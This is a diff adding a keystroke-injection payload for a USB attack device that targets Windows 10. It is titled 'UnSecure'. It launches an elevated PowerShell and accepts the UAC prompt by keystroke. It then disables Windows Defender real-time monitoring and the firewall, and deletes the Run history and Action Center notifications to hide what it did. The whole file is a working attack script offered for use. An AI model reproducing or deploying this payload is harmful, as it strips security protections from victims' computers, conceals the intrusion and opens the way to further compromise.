@@ -1,0 +1,52 @@
+#UnSecure
+*Author: icy
+*version: .5
+*quickly and eaisly disable all of windows default protection. Disables windows defender and windows firewall. Then cleans up after itself.
+*Target: windows 10
+
+ATTACKMODE HID
+LED B 1000
+
+#launches run
+Q GUI r
+Q DELAY 500
+
+#starts admin powershell
+Q STRING powershell -c "Start-Process powershell -verb runas"
+Q ENTER
+Q DELAY 1000
+Q ALT
+Q DELAY 500
+Q Y
+Q DELAY 1000
+
+#disables windows defender
+Q STRING Set-MpPreference -DisableRealtimeMonitoring 1
+Q ENTER
+Q DELAY 500
+
+#disables windows firewall
+Q STRING set-netfirewallprofile -enabled false
+Q ENTER
+Q DELAY 500
+
+#clears run history
+Q STRING 'REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f'
+Q ENTER
+Q DELAY 500
+
+#exits power shell
+Q STRING EXIT
+Q ENTER
+Q DELAY 1000
+
+#clears windows 10 action center
+Q GUI a
+Q DELAY 500
+Q TAB
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+Q ESC
+
+LED G 1000
